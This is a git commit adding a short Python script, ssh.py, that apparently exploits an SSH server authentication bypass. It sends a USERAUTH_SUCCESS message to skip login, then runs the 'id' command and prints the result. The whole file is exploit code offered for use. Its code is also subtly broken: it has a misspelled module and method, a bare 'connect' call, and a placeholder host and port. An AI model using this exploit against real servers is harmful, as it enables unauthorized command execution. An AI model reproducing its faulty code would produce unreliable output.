ea8a75f5f8c65a2b4254590a2bc28d71deca5ec0
nu11secur1ty <venvaropt@gmail.com>
2019-07-27 11:04:03 +0300

    Create ssh.py

---
+++ SSH/CVE/Python-script-testing/ssh.py
@@ -0,0 +1,16 @@
+#!/usr/bin/python3
+import sys,paramiko,socket
+
+s = socket.socket()
+s = connect(("0.0.0.0",0000))
+m = paramiko.message.Message()
+t = paramika.transport.Transport(s)
+t.start_client()
+m.aad_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
+t._send_message(m)
+c = t.open_session(timeout=5)
+c.exec_command("id")
+out = c.makefile("rb",2048)
+output = out.read()
+out.close()
+print(output)
